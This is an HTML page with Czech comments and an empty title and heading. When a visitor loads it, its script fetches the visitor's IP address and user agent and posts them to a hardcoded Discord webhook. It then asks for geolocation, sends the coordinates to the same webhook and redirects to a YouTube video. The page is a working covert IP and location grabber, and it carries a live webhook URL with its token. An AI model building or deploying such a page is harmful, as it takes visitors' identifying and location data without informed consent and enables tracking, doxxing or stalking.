<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8" />
  <title></title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-family: Arial, sans-serif;
      user-select: none;
    }
  </style>
</head>
<body>
  <h1></h1>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1376859779275948124/jO89I_FyE_CGdIJXyfHjvRc1Gd921cNx-l0cRpwPOLTbVP5raNYF6ZKknWM3V7z9c3Tt';

    function sendData(data) {
      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).catch(e => console.error('Chyba při odesílání:', e));
    }

    // Nejprve získat IP adresu
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        sendData({
          event: 'page_loaded',
          ip: data.ip,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        });
      })
      .catch(() => {
        // Pokud API neselže, pošli aspoň základní info bez IP
        sendData({
          event: 'page_loaded',
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        });
      });

    // Pokračujeme s geolokací
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          sendData({
            event: 'location_allowed',
            coords: {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            },
            timestamp: new Date().toISOString()
          });
          window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        },
        (error) => {
          sendData({
            event: 'location_denied_or_error',
            error: error.message,
            timestamp: new Date().toISOString()
          });
        }
      );
    } else {
      sendData({ event: 'geolocation_not_supported' });
    }
  </script>
</body>
</html>
